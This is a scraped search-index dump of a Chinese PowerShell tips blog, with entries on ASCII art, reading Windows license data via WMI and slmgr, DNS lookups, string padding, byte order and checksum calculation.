请确保调整了代码中的路径。将会在缺省的文本编辑器中打开 ASCII 艺术。请确保禁用了换行，选择一个等宽的字体和一个足够小的字号！ ;@&amp;&amp;&amp;&amp;&amp;&amp;@&amp;&amp;&amp;&amp;@+- :@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;:. ,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;* -@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;HHHHHH&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;* :&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@ *&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;, :&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;- *&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;* &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; @&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;- &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;@;:+&amp;&amp;&amp;&amp;&amp;&amp;&amp;*-....,:@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;;........................*&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;. .&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H;...........................&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;- ;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;:............................@@&amp;&amp;&amp;&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.+...........................-.;&amp;&amp;&amp;H&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@ *&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;;;..............................+@+&amp;&amp;HH&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; ;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;................................@*.&amp;&amp;&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;: :&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;*...............................:*..&amp;H&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@ ,&amp;&amp;H&amp;&amp;&amp;@&amp;@...................................,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;, ,&amp;&amp;&amp;&amp;&amp;&amp;:+....................................+*.;:&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; +&amp;&amp;&amp;&amp;&amp;&amp;............................................@*@+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;, &amp;&amp;&amp;&amp;&amp;&amp;;............................................,-..-+&amp;&amp;&amp;&amp;&amp;&amp;&amp; :&amp;&amp;&amp;&amp;&amp;@-...................................................:&amp;&amp;&amp;&amp;&amp;, &amp;&amp;&amp;&amp;&amp;&amp;&amp;.....................................................&amp;&amp;&amp;&amp;&amp;- &amp;&amp;&amp;&amp;&amp;&amp;+.....................................................&amp;&amp;&amp;&amp;&amp;,, :&amp;&amp;&amp;&amp;&amp;;.....................................................&amp;&amp;&amp;H&amp; &amp;&amp;&amp;&amp;&amp;;.......................................,.,...........&amp;&amp;&amp;&amp;H&amp;@ *-&amp;&amp;&amp;&amp;:...*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@*,.............-*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;:.....@&amp;&amp;&amp;&amp;+ &amp;&amp;&amp;&amp;:.+&amp;&amp;HHHHHHHHHHHHH&amp;&amp;&amp;&amp;..........+&amp;&amp;&amp;&amp;HHHHHHHHHHHHH*...+&amp;&amp;&amp;&amp;@ ,###H*+;;:,...........-;*&amp;&amp;##########&amp;&amp;&amp;*:..........:;*@:;*&amp;###H: :##H*.......................#@;---+#;.......................@###. ,@###+............+HH&amp;+.....-&amp;......-*......;&amp;H&amp;*............&amp;##:. ,&amp;&amp;#-...........HHH&amp;+H;....@;......,#.....@HHH;H@...........HH&amp;-. ..;#,...........HHHHHH+....#........H,....&amp;HHHHH&amp;..........-#&amp;:- ...H*...........-;;;;;....-H........;@....,;;;;;,..........;#&amp;.. ...&amp;#.....................#-.........#.....................&amp;H*.. ...:H&amp;........,.........-#@..........-#;..........,,......:#&amp;,.. ...-,&amp;###&amp;+::-,,::+&amp;###+...... ......-###H*:::,,::+@####,.... ..........,,,,,,,,........... ............,,,,,,,,.......... ............................ .............................. ............................ ............................. .....................,..... ............................ ....................,..... .......,................... ..................,,,... .......,................. ......................,. ..,...................... ........................,,,....................... .................................................. ................................................. .............,-..................--............. ...............--,,-----:-,. --............... ..................,,----,,................... ........................................... ......................................... ...................................... .................................... ................................ .............................. .,,,,,,,,,,,,,,,,,,,,,,,,,, ,&amp;...,,,,,,,,,,,,,,,,,,,,,,...@, &amp;HHH......,,,,,,,,,,,,,,,,,,.....-HHH&amp; :HHHHHHH&amp;.........,,,,,,,,,,,........HHHHHHHH; *HHHHHHHHHHHH+........................*HHHHHHHHHHHH@ -HHHHHHHHHHHHHHHHH&amp;;..................;&amp;HHHHHHHHHHHHHHHHH, HHHHHHHHHHHHHHHHHHHHHHHH&amp;*;:---::;*&amp;HHHHHHHHHHHHHHHHHHHHHHH&amp; HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH 这儿有一个很酷的优化技巧：在 Convert-ImageToAsciiArt 函数中，请注意 $characters。它是一个包含 ASCII 艺术中使用的字符的字符串，而这些字符是按亮度降序排列的。对于黑白作品，可以使用： 1$characters = [char]0x2588, ' '","link":"/2019/02/22/create-ascii-art/"},{"title":"PowerShell 技能连载 - 管理 Windows 许可证密钥（第 1 部分）","text":"我们来看看这个单行的解析 Windows 许可证密钥的迷你系列： 1234PS&gt; $key = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKeyPS&gt; $keyKJU8F-XXUZH-UU776-IUZGT-HHGR5 今日知识点： WMI 可以获取许多关于 Windows 许可证和 Windows 许可证状态的信息。 Windows 用于许可证管理的一个 WMI 名为 “SoftwareLicensingService”。它可以提供 Windows 许可证号码。 同一个类叶包含了许多额外的信息。请看： 12345678910111213141516171819202122PS&gt; Get-WmiObject -Class SoftwareLicensingService...KeyManagementServiceUnlicensedRequests : 4294967295OA2xBiosMarkerMinorVersion : 1OA2xBiosMarkerStatus : 1OA3xOriginalProductKey : XXXXXXXXXOA3xOriginalProductKeyDescription : [4.0] Professional OEM:DMOA3xOriginalProductKeyPkPn : [TH]X19-99481PolicyCacheRefreshRequired : 0RemainingWindowsReArmCount : 1001RequiredClientCount : 4294967295TokenActivationAdditionalInfo :TokenActivationCertificateThumbprint :TokenActivationGrantNumber : 4294967295TokenActivationILID :TokenActivationILVID : 4294967295Version : 10.0.17134.471VLActivationInterval : 4294967295VLRenewalInterval : 4294967295PSComputerName : DESKTOP-7AAMJLF title: “PowerShell 技能连载 - 管理 Windows 许可证密钥”description: PowerTip of the Day - Managing Windows License Keycategories: powershell tiptags: powershell tip powertip series 我们来看看这个单行的解析 Windows 许可证密钥的迷你系列： 1234PS&gt; $key = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKeyPS&gt; $keyKJU8F-XXUZH-UU776-IUZGT-HHGR5 今日知识点： WMI 可以获取许多关于 Windows 许可证和 Windows 许可证状态的信息。 Windows 用于许可证管理的一个 WMI 名为 “SoftwareLicensingService”。它可以提供 Windows 许可证号码。 同一个类叶包含了许多额外的信息。请看： 12345678910111213141516171819202122PS&gt; Get-WmiObject -Class SoftwareLicensingService...KeyManagementServiceUnlicensedRequests : 4294967295OA2xBiosMarkerMinorVersion : 1OA2xBiosMarkerStatus : 1OA3xOriginalProductKey : XXXXXXXXXOA3xOriginalProductKeyDescription : [4.0] Professional OEM:DMOA3xOriginalProductKeyPkPn : [TH]X19-99481PolicyCacheRefreshRequired : 0RemainingWindowsReArmCount : 1001RequiredClientCount : 4294967295TokenActivationAdditionalInfo :TokenActivationCertificateThumbprint :TokenActivationGrantNumber : 4294967295TokenActivationILID :TokenActivationILVID : 4294967295Version : 10.0.17134.471VLActivationInterval : 4294967295VLRenewalInterval : 4294967295PSComputerName : DESKTOP-7AAMJLF","link":"/2019/02/25/managing-windows-license-key/"},{"title":"PowerShell 技能连载 - 管理 Windows 授权密钥（第 2 部分）","text":"大多数的授权密钥管理任务都可以通过 slmgr 命令完成。 This command is actually an ancient VBScript. To read all of your license settings, for example, try this:这个命令实际上是一个古老的 VBScript。例如要读取所有许可证设置，请使用以下代码： 1PS&gt; slmgr.vbs /dlv 这将打开一个独立的窗口，并且显示许多许可证激活细节。在对话框窗口中显示信息对于 PowerShell 和自动化操作帮助不大，而且通过 cscript.exe 运行该 VBScript，可能会失败： 123456789PS&gt; slmgr.vbs /dlvPS&gt; cscript.exe slmgr.vbs /dlvMicrosoft (R) Windows Script Host, Version 5.812Copyright (C) Microsoft Corporation. All Rights Reserved.Script file &quot;C:\\Users\\tobwe\\slmgr.vbs&quot; not found.PS&gt; 您可以将缺省的 VBS 宿主改为 cscript.exe，但是一个更好的不改变全局设置的做法是：找出这个 VBScript 的完整路径，然后用绝对路径执行它。以下是获得 VBScript 路径的办法： 12PS&gt; Get-Command slmgr.vbs | Select-Object -ExpandProperty SourceC:\\WINDOWS\\system32\\slmgr.vbs 这段代码将读取该信息输出到 PowerShell 控制台： 123$Path = Get-Command slmgr.vbs | Select-Object -ExpandProperty Source$Data = cscript.exe //Nologo $Path /dlv$Data 不过，$Data 包含了难以阅读的纯文本，而且是本地化的。用这种方法获取许可证和激活信息不太优雅。 由于 slmgr.exe 可以做许多神奇的许可证任务，就如打开它的帮助时看到的那样，让我们在随后的技能中检查它的源码，并且跳过以前的 VBScript 直接获取信息。 1PS&gt; slmgr /? 今日知识点： Windows 许可证管理通常是通过一个 VBScript slmgr.vbs 来实现。当您通过 “/?“ 调用它，将会获得该命令参数的帮助信息。 PowerShell 可以调用 slmgr。要接收执行结果，请通过 cscript.exe 调用它，并且向 slmgr.vbs 提供完整的（绝对）路径。 Get-Command 是一个查找系统文件夹（在 $env:PATH 中列出的）中的文件的完整（绝对）路径的方法。","link":"/2019/02/26/managing-windows-license-key-part-2/"},{"title":"PowerShell 技能连载 - 管理 Windows 授权密钥（第 3 部分）","text":"多数 Windows 许可证激活任务可以通过一个古老的名为 slmgr.vbs 的 VBScript 来实现自动化。不过，用这个工具来获取信息的意义不大。因为 slmgr.vbs 使用的事本地化的字符串，并且将所有数据转换为一个大字符串格式。 一个更好的方法是跳过 slmgr.vbs，而直接查询信息源。要搞清 slmgr.vbs 如何实现这些功能，您可以查看该脚本的源码。请在 PowerShell ISE 中运行这段代码： 1234# get the path to the script file$Path = Get-Command slmgr.vbs | Select-Object -ExpandProperty Source# load the script file$file = $psise.CurrentPowerShellTab.Files.Add($Path) 让我开始将这部分功能转换为 PowerShell。例如 /dlv 参数显示许可证信息： 1PS&gt; slmgr.vbs /dlv 当您在 VBScript 源码中搜索 “dlv”，能快速找到所有相关的核心代码，有一个名为 GetServiceObject() 的函数，是关于简单 WMI 查询的： 1g_objWMIService.ExecQuery(&quot;SELECT &quot; &amp; strQuery &amp; &quot; FROM &quot; &amp; ServiceClass) 实际上，该脚本展现了关于许可证方面的 WMI 类。从 PowerShell 中您可以方便地查询所有跟它有关的服务信息： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152PS&gt; Get-WmiObject -Class SoftwareLicensingService__GENUS : 2__CLASS : SoftwareLicensingService__SUPERCLASS :__DYNASTY : SoftwareLicensingService__RELPATH : SoftwareLicensingService.Version=&quot;10.0.17134.471&quot;__PROPERTY_COUNT : 38__DERIVATION : {}__SERVER : DESKTOP-7AAMJLF__NAMESPACE : root\\cimv2__PATH : \\\\DESKTOP-7AAMJLF\\root\\cimv2:SoftwareLicensingService.Version=&quot;10.0.17134.471&quot;ClientMachineID :DiscoveredKeyManagementServiceMachineIpAddress :DiscoveredKeyManagementServiceMachineName :DiscoveredKeyManagementServiceMachinePort : 0IsKeyManagementServiceMachine : 0KeyManagementServiceCurrentCount : 4294967295KeyManagementServiceDnsPublishing : TrueKeyManagementServiceFailedRequests : 4294967295KeyManagementServiceHostCaching : TrueKeyManagementServiceLicensedRequests : 4294967295KeyManagementServiceListeningPort : 1688KeyManagementServiceLookupDomain :KeyManagementServiceLowPriority : FalseKeyManagementServiceMachine :KeyManagementServiceNonGenuineGraceRequests : 4294967295KeyManagementServiceNotificationRequests : 4294967295KeyManagementServiceOOBGraceRequests : 4294967295KeyManagementServiceOOTGraceRequests : 4294967295KeyManagementServicePort : 1688KeyManagementServiceProductKeyID :KeyManagementServiceTotalRequests : 4294967295KeyManagementServiceUnlicensedRequests : 4294967295OA2xBiosMarkerMinorVersion : 1OA2xBiosMarkerStatus : 1OA3xOriginalProductKey : XXXXXXXXXXXXXXXXXXXXXXXXXOA3xOriginalProductKeyDescription : [4.0] Professional OEMOA3xOriginalProductKeyPkPn : [TH]XXXXXXXPolicyCacheRefreshRequired : 0RemainingWindowsReArmCount : 1001RequiredClientCount : 4294967295TokenActivationAdditionalInfo :TokenActivationCertificateThumbprint :TokenActivationGrantNumber : 4294967295TokenActivationILID :TokenActivationILVID : 4294967295Version : 10.0.17134.471VLActivationInterval : 4294967295VLRenewalInterval : 4294967295PSComputerName : DESKTOP-7AAMJLF 和 slmgr.vbs 不同，您可以以面向对象的格式获得该信息，所以访问具体的项十分容易： 12345678PS&gt; $all = Get-WmiObject -Class SoftwareLicensingServicePS&gt; $all.OA3xOriginalProductKeyDescription[4.0] Professional OEM:DMfuncValue 1} 还有更多内容可以发现。 今日知识点： slmgr.vbs 返回的所有 Windows 许可证信息都来自 WMI。相比于 slmgr.vbs 收到的是难以阅读的文本，您可以直接查询 WMI 并跳过 slmgr.vbs。 一个大数据源是 SoftwareLicensingService WMI 类。","link":"/2019/02/27/managing-windows-license-key-part-3/"},{"title":"PowerShell 技能连载 - 管理 Windows 授权密钥（第 4 部分）","text":"Slmgr.vbs 是一个用于自动化 Windows 许可证管理的古老的 VBScript。在前一个技能中我们开始直接读取 WMI，跳过 slmgr.vbs。除了已经介绍过的 SoftwareLicensingService 类，还有一个 SoftwareLicensingProduct 拥有许多实例并且获取需要一些时间： 1Get-WmiObject -Class SoftwareLicensingProduct | Out-GridView 描述列展示了这个类描述了 Windows 中许多不同的可用的许可证类型，只有其中的一部分有获得授权。要获得有用的信息，您需要过滤出正在使用的许可证信息。 用 -Filter 参数来使用服务端过滤器可以大大加速查询速度。请确保 WMI 只返回 ProductKeyId 非空的实例： 1Get-WmiObject -Class SoftwareLicensingProduct -Filter 'ProductKeyId != NULL' | Select-Object -Property Name, Description, LicenseStatus, EvaluationEndDate, PartialProductKey, ProductKeyChannel, RemainingAppRearmCount, trustedTime, UseLicenseUrl, ValidationUrl | Out-GridView 结果显示在一个网格视图窗口中，看起来类似这样： Name : Office 16, Office16ProPlusR_Grace edition Description : Office 16, RETAIL(Grace) channel LicenseStatus : 5 EvaluationEndDate : 16010101000000.000000-000 PartialProductKey : XXXXX ProductKeyChannel : Retail RemainingAppRearmCount : 1 trustedTime : 20190203111404.180000-000 UseLicenseUrl : https://activation.sls.microsoft.com/SLActivateProduct/SLActivateProduct.asmx?c onfigextension=o14 ValidationUrl : https://go.microsoft.com/fwlink/?LinkID=187557 Name : Office 16, Office16ProPlusMSDNR_Retail edition Description : Office 16, RETAIL channel LicenseStatus : 1 EvaluationEndDate : 16010101000000.000000-000 PartialProductKey : XXXXX ProductKeyChannel : Retail RemainingAppRearmCount : 1 trustedTime : 20190203111404.622000-000 UseLicenseUrl : https://activation.sls.microsoft.com/SLActivateProduct/SLActivateProduct.asmx?c onfigextension=o14 ValidationUrl : https://go.microsoft.com/fwlink/?LinkID=187557 Name : Windows(R), Professional edition Description : Windows(R) Operating System, OEM_DM channel LicenseStatus : 1 EvaluationEndDate : 16010101000000.000000-000 PartialProductKey : XXXXX ProductKeyChannel : OEM:DM RemainingAppRearmCount : 1001 trustedTime : 20190203111405.221000-000 UseLicenseUrl : https://activation-v2.sls.microsoft.com/SLActivateProduct/SLActivateProduct.asm x?configextension=DM ValidationUrl : https://validation-v2.sls.microsoft.com/SLWGA/slwga.asmx 如您所见，日期是以 WMI 格式返回的。用 Get-CimInstance 代替 Get-WmiObject 来获取“真实的”日期对象： 1PS&gt; Get-CimInstance -Class SoftwareLicensingProduct -Filter 'ProductKeyId != NULL' | Select-Object -Property Name, Description, LicenseStatus, EvaluationEndDate, PartialProductKey, ProductKeyChannel, RemainingAppRearmCount, trustedTime, UseLicenseUrl, ValidationUrl 今日知识点： 通过 SoftwareLicensingProduct WMI 类可以获取到独立的微软产品（包括 Office）许可证信息。 如果您希望 PowerShell 返回可阅读的 DateTime 对象，而不是难阅读的 WMI 日期格式，请使用 Get-CimInstance 来代替 Get-WmiObject。","link":"/2019/02/28/managing-windows-license-key-part-4/"},{"title":"PowerShell 技能连载 - 计算机名、DNS 名称，和 IP 地址","text":"以下是一个单行的代码，返回您计算机的当前 IP 地址和它的完整 DNS 名： 12345PS&gt; [System.Net.Dns]::GetHostEntry('')HostName Aliases AddressList-------- ------- -----------DESKTOP-7AAMJLF {} {fe80::532:c4e:c409:b987%18, 192.168.2.129} 要检测一台远程的及其，只需要传入远程计算机的名字来代替空白字符串即可： 12345PS&gt; [System.Net.Dns]::GetHostEntry('microsoft.com')HostName Aliases AddressList-------- ------- -----------microsoft.com {} {40.113.200.201, 40.76.4.15, 104.215.148.63, 13.77.161.179...} 如果你只希望获取绑定的 IP 地址列表，请试试以下代码： 123456PS&gt; [System.Net.Dns]::GetHostEntry('microsoft.com').AddressList.IPAddressToString40.113.200.20140.76.4.15104.215.148.6313.77.161.17940.112.72.205 今日知识点： System.Net.Dns 类包含许多有用的 DNS 相关方法。GetHostEntry() 非常有用，因为它既可以接受计算机名称也可以接受 IP 地址，并返回对应的 DNS 名和 IP 地址。 传入空白字符串可以查看本机的设置。","link":"/2019/03/01/computer-name-dns-name-and-ip-address/"},{"title":"PowerShell 技能连载 - 创建对齐的标题","text":"在 PowerShell 中常常需要创建报表和日志。以下是一个创建漂亮的居中标题的函数。只需要将 $width 改为期望的宽度： 123456function Show-Header($Text){ $Width=80 $padLeft = [int]($width / 2) + ($text.Length / 2) $text.PadLeft($padLeft, &quot;=&quot;).PadRight($Width, &quot;=&quot;) } 以下是执行结果： 1234567891011PS&gt; Show-Header Starting====================================Starting====================================PS&gt; Show-Header &quot;Processing Input Values&quot;=============================Processing Input Values============================PS&gt; Show-Header &quot;Calculating...&quot;=================================Calculating...=================================PS&gt; Show-Header &quot;OK&quot;=======================================OK======================================= 额外的知识点如下： 使用 PadLeft() 和 PadRight() 来填充（扩展）两端，并且是使用您希望的字符来填充空白。 基于这个知识点，现在可以做许多相关的事情，例如创建一个固定宽度的服务器名称列表： 1234561,4,12,888 | ForEach-Object { 'Server_' + &quot;$_&quot;.PadLeft(8, &quot;0&quot;) }Server_00000001Server_00000004Server_00000012 Server_00000888","link":"/2019/03/04/creating-aligned-headers/"},{"title":"PowerShell 技能连载 - 接受不带引号的参数","text":"在前一个技能中，我们介绍了一个能够输入一个字符串并生成完美居中的标题的函数。以下是该函数和它的执行结果： 12345678910111213function Show-Header($Text){ $Width=80 $padLeft = [int]($width / 2) + ($text.Length / 2) $text.PadLeft($padLeft, &quot;=&quot;).PadRight($Width, &quot;=&quot;)}PS&gt; Show-Header Starting====================================Starting====================================PS&gt; Show-Header &quot;Processing Input Values&quot;=============================Processing Input Values============================ 如您所见，这个函数工作起来很完美，但是如果该字符串包含空格或其它特殊字符，用户需要用双引号将它包起来。难道不能让这个函数接受没有双引号的字符串，并将所有的输入视为一个参数吗？ 这是完全可能的，如下： 这个参数定义了明确的数据类型，例如 [string]，那么 PowerShell 就了解了应当如何处理您的参数。 只能使用单个参数，这样 PowerShell 便知道了所有的输入项都需要转换为该参数。 以下是修改后的函数： 123456function Show-Header([Parameter(ValueFromRemainingArguments)][string]$Text){ $Width=80 $padLeft = [int]($width / 2) + ($text.Length / 2) $text.PadLeft($padLeft, &quot;=&quot;).PadRight($Width, &quot;=&quot;)} 魔力是通过 ValueFromRemainingArguments 属性产生的，用户可以简单地输入文字并切不需要使用双引号： 12345PS&gt; Show-Header Starting====================================Starting====================================PS&gt; Show-Header Processing Input Values=============================Processing Input Values============================ 然欧，有一点需要注意：任何特殊字符，例如圆括号和双引号仍会干扰解析。在这些情况下，您需要像之前那样将字符串用双引号包起来。 今日知识点： 用 ValueFromRemainingArguments 属性使 PowerShell 能够将所有未绑定（额外）的参数分配到该参数上。 使用清晰的数据类型做为参数，这样 PowerShell 知道如何转换含糊的数据。例如，没有 [string] 数据类型的话，如果输入值包含空格，PowerShell 将会为创建一个字符串数组。","link":"/2019/03/05/accepting-parameters-without-quotes/"},{"title":"PowerShell 技能连载 - 计算最高和最低有效字节","text":"数字在内部是以字节的形式存储的。例如一个 Int32 数值使用 4 个字节。有些时候需要将数字分割为字节，例如要以 TODO least significiant 字节顺序计算校验和。 我们创建了一个快速的全览，您也可以将它当作一个基本的数字处理教程。它演示了数字如何对应到字节，并且如何计算最低有效字节 (LSB) 和最高有效字节 (MSB)，以及其它： 1234567891011121314151617181920212223242526272829303132333435363738394041424344function Show-Header([Parameter(ValueFromRemainingArguments)][string]$Text){ $Width=80 $padLeft = [int]($width / 2) + ($text.Length / 2) '' $text.PadLeft($padLeft, &quot;=&quot;).PadRight($Width, &quot;=&quot;) ''}Show-Header Starting with this number:$number = 26443007$numberShow-Header Display the bits for this number:$bits = [Convert]::ToString($number,2)$bitsShow-Header Add missing leading zeroes:# pad the string to its full bit range (32 bits)$bitsAligned = $bits.PadLeft(32, '0')$bitsAlignedShow-Header Display the four byte groups$bitsAligned -split '(?&lt;=\\G.{8})(?=.)' -join '-'Show-Header Get the bytes by conversion to IPAddress object:$bytes = ([Net.IPAddress]$number).GetAddressBytes()$bytesShow-Header Display the bits for the IPAddress bytes:$bitbytes = $bytes | ForEach-Object { [Convert]::ToString($_, 2).PadLeft(8,'0')}$bitbytes -join '-'Show-Header Show the Least Significant Byte LSB:$bytes[0]Show-Header Show LSB by turning the 8 bits to the right into a number to verify:$bits = [Convert]::ToString($number, 2)# take least significant bits[Convert]::toByte($bits.Substring($bits.Length-8),2)Show-Header Show the Most Significant Byte MSB:$bytes[3] 如您所见，有许多方法可以实现。一个特别聪明的办法是将数字转换为一个 IPAddress。IPAddress 对象有一个好用的 GetAddressBytes() 方法，可以将数字轻松地分割为字节。 结果看起来类似这样： ===========================Starting with this number:=========================== 26443007 =======================Display the bits for this number:======================== 1100100110111110011111111 ===========================Add missing leading Zeroes:========================== 00000001100100110111110011111111 ==========================Display the four byte groups========================== 00000001-10010011-01111100-11111111 ================Get the bytes by conversion to IPAddress object:================ 255 124 147 1 ===================Display the bits for the IPAddress bytes:==================== 11111111-01111100-10010011-00000001 ======================Show the Least Significant Byte LSB:====================== 255 ======Show LSB by turning the 8 bits to the right into a number to verify:====== 255 =======================Show the Most Significant Byte MSB:====================== 1","link":"/2019/03/06/calculating-most-and-least-significant-byte/"},{"title":"PowerShell 技能连载 - 求比特位反码","text":"有些时候需要求一个数字的比特位反码。最常见的情况是属于某种自定义的算法或计算校验。这引出了一个通用的问题：最简单的实现方法是什么？ “求比特位反码”操作可以通过 -bnot 操作符实现，类似这样： 12345$number = 76[Convert]::ToString($number,2)$newnumber = -bnot $number[Convert]::ToString($newnumber,2) 不过，结果会显示一个警告： 1001100 11111111111111111111111110110011 这个操作符总是针对 64 位的有符号数。一个更好的方法是使用 -bxor 操作符，并且根据需要颠倒的数据类型提供对应的比特位掩码。对于一个字节，比特位掩码是 0xFF，对于 Int32，比特位掩码是 0xFFFFFFFF。以下是一个求某个字节的比特位反码的示例。我们将一个字符串结果填充至 8 个字符，来确保前导零可见： 12345$number = 76[Convert]::ToString([byte]$number,2).PadLeft(8, '0')$newnumber = $number -bxor 0xFF[Convert]::ToString($newnumber,2).PadLeft(8, '0') 结果是正确的： 01001100 10110011 今日知识点： PowerShell 包含了许多二进制操作符，它们都以 -b... 开头。 要求比特位反码，您可以使用 -bnot。如果只要反转某几位，请使用 -bxor 和自定义比特掩码。","link":"/2019/03/07/inverting-bits/"},{"title":"PowerShell 技能连载 - 通过校验位测试原始数据——实际案例","text":"随着 PowerShell 进入物联网世界，有些时候需要处理二进制的传感器数据和古老的校验模型来确保数据的完整性。 这是一个如何用 PowerShell 处理传感器数据并且校验其正确性的真实案例。这里介绍的案例仅适用于特定的用例，但是这里介绍的技术原理对类似的传感器依然有效。 在这个例子中，PowerShell 收到一系列十六进制数据 ($data)。校验码是最后一个字节 (3A)。它的定义是数据报文中所有字节的和。在这个总和中用的是最低有效字节来表示校验位，而且要求比特为反码。听起来很奇怪但是有道理。通过这种方式计算出来的校验和永远只有一个字节。 以下是 PowerShell 处理这些需求的方法，将校验位和计算出来的校验位对比，就可以测试数据的完整性： 123456789101112131415161718192021222324252627$data = '00030028401D2E8D4022C0EE4022C0E64022C0E6418B4ACD419FE7B641A05F0E41A060D041A061C23F0A7CDA3A'# checksum is last byte$checksum = [Convert]::ToByte($data.Substring($data.Length-2,2), 16)# remove checksum from data$data = $data.Substring(0, $data.Length -2)# sum up all bytes$sum = $data -split '(?&lt;=\\G.{2})(?=.)' | Foreach-Object {$c = 0}{$c+=[Convert]::ToByte($_,16)}{ $c }# get the least significant byte$lsb = ([Net.IPAddress]$sum).GetAddressBytes()[0]# invert bits$checksumReal = $lsb -bxor 0xFF# compareif ($checksum -ne $checksumReal){ throw &quot;Checksum does not match&quot;}else{ Write-Warning &quot;Checksum ok&quot;} 今日知识点： 用 [Convert]::ToByte($number, 16) 将十六进制字符串转换为数字。 通过正则表达式，可以很容易地将一个字符流（例如十六进制对）转换为一对一对字符的列表，这样可以计算总和。 通过将一个数字转换为 IPAddress，可以方便地操作不同的字节顺序 (LSB, MSB)。 用 -bxor 求比特位反码。","link":"/2019/03/08/testing-raw-data-with-checksums-a-real-world-example/"},{"title":"PowerShell 技能连载 - 从图片中创建彩色 ASCII 艺术","text":"在之前的技能中我们介绍了如何读取任何图片或照片，并将它转换为一个黑白 ASCII 艺术。今天，我们将修改 Convert-ImageToAsciiArt 函数：它输入一个函数并将它转换为彩色的 ASCII 艺术！ 像素的亮度值将被转换为合适的 ASCII 字符，并且像素的颜色值将应用到该字符。ASCII 艺术将写入 HTML 文件，因为 HTML 是表示彩色文字的最简单格式。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566function Convert-ImageToAsciiArt{ param( [Parameter(Mandatory)][String] $ImagePath, [Parameter(Mandatory)][String] $OutputHtmlPath, [ValidateRange(20,20000)] [int]$MaxWidth=80 ) , # character height:width ratio [float]$ratio = 1.5 # load drawing functionality Add-Type -AssemblyName System.Drawing # characters from dark to light $characters = &amp;#39;$#H&amp;@*+;:-,. &amp;#39;.ToCharArray() $c = $characters.count # load image and get image size $image = [Drawing.Image]::FromFile($ImagePath) [int]$maxheight = 